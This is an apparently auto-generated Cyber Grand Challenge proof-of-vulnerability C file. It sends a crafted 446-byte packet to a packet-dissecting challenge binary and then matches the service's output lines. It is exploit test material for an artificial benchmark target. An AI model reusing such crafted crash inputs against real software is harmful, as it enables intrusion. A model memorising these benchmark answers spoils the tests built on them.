#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xbe\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\x9e\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x9e\x01\x00\x00"
         "\xea\x40\x66\xbb\x2a\x4f\xac\xda\x60\x56\x30\xf8\x67\x73\xe3\x5c"
         "\x68\xea\xc4\x6f\x59\x00\x00\x00\xfd\xee\x01\x00\x39\xc3\xd5\x58"
         "\x37\x61\x1c\x03\x76\xfd\x7e\xe2\x03\x23\x41\x00\x01\x41\xa2\xec"
         "\x92\xb1\x6f\xea\x47\xc1\x54\xc2\x12\xe7\xa4\xc1\x49\x56\x56\x97"
         "\x8b\x7f\xb2\x2a\xcf\x8e\x41\x00\x41\x00\xe5\xb2\x8c\xc9\x41\x00"
         "\xe8\xdf\x46\x81\x37\x69\x8d\x04\x41\x00\x20\xe5\x03\x5a\x2d\x3b"
         "\xf1\x10\xd8\x9b\xd8\xeb\x29\x68\xc8\x19\x9a\xd2\xc1\x4a\x6f\xbd"
         "\xab\xb6\xd0\x7f\xb8\x51\x66\x2e\xfb\xa0\x62\x6c\x7c\xe6\x0e\x53"
         "\x41\x00\x41\x00\x41\x00\x01\x00\xf6\xed\xb4\x3d\xc1\xff\x63\x90"
         "\x44\x23\x23\x39\xe2\xb4\x82\xfb\x14\xc6\x32\xab\x91\x4f\x67\x20"
         "\x65\x29\xcc\xbd\x3d\xe7\xa1\xfb\x9d\x1a\x56\x97\x1f\x56\x2d\xf2"
         "\xd9\xaf\x1d\x44\x8a\x05\x10\x6a\xa1\x54\x10\x89\x98\x12\x68\xd6"
         "\x03\xd9\x9b\xe8\xf3\xf5\xd3\xd4\xb7\x38\x4f\xd2\x5d\x73\x15\x02"
         "\x65\x9d\x7b\x2f\x81\x48\x87\x27\x41\xff\xfb\xc7\xf4\xfd\x0d\x56"
         "\xad\xd1\x43\x6f\x55\xca\x3e\xe4\xaf\x7f\xb1\x60\xa8\x92\x12\x8f"
         "\x1d\xd7\x30\x05\x6c\xa5\x8a\x10\xc1\x7d\x3e\xe1\xb4\x33\x85\x50"
         "\xdd\x4f\x9f\xad\x1d\x10\xe4\xd9\x39\x6f\x6f\x2a\x51\x1c\x4b\x2d"
         "\x21\x50\x58\xfe\x58\xdf\x5c\x5f\xdd\x14\xa1\xd2\x49\x66\x87\x27"
         "\x92\x3e\x6d\xed\x7e\xc0\xd9\xd7\xf7\xb4\x1d\x84\x49\xe5\xc3\x35"
         "\x60\x42\xba\xa1\xb0\xbd\x07\xf3\x9c\x17\x0b\x06\x53\x7d\x57\x67"
         "\xd7\xea\x00\x50\xa0\xee\x42\x21\x25\x79\x4d\xd0\x0b\x8d\xd0\x07"
         "\x1e\xbf\x8a\x1c\x59\x6a\x9b\x5a\x61\x40\xf3\x3e\xdf\x50\x02\x32"
         "\x9e\x4c\x88\xc8\xaa\xeb\x87\x96\xe3\xe7\x71\xe8\xc2\x36\x43\xc6"
         "\xc6\xef\x9c\xd0\x16\x47\x00\x90\x89\xaa\x90\x10\xaf\xc5\xf2\xf9"
         "\x92\x21\x48\xac\xec\x62\x09\xc2\x94\x54\xe1\x41\x4f\x41\x00\x01"
         "\x00\xea\xec\x3a\x94\x38\xc8\x60\x92\x55\x7f\x8b\xd3\xcc";
      static unsigned int write_00001_00000_len = 446;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamaParthenon
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x50\x61\x72\x74\x68\x65"
         "\x6e\x6f\x6e";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
